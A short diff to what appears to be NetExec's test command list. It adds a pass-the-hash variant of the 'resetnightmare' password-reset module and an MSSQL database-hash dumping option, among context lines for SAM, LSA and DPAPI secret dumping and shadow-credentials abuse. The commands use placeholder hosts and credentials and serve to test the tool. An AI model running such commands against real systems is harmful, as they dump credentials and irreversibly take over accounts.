@@ -268,6 +268,7 @@ netexec ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M shadow-
 #netexec ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M shadow-creds -o TARGET=SHADOW_CREDS_TARGET$ ACTION=remove DEVICE_ID=SHADOW_CREDS_DEVICE_ID
 # resetnightmare resets a real account password with no restore and needs a controlled account with GenericWrite on its UPN + an unpatched DC, run manually, not in CI
 #netexec ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M resetnightmare -o TARGET=TARGET_ACCOUNT NEW_PASSWORD=Password123! UPN_USER=CONTROLLED_ACCOUNT UPN_PASSWORD=Password1
+#netexec ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M resetnightmare -o TARGET=TARGET_ACCOUNT NEW_PASSWORD=Password123! UPN_USER=CONTROLLED_ACCOUNT UPN_NTHASH=31d6cfe0d16ae931b73c59d7e0c089c0
 ##### WINRM
 netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS # need an extra space after this command due to regex
 netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig
@@ -306,6 +307,7 @@ netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --databas
 netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --sam
 netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --lsa
 netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --dpapi
+netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --db-hash
 netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --list-backups
 ##### MSSQL PowerShell
 netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig
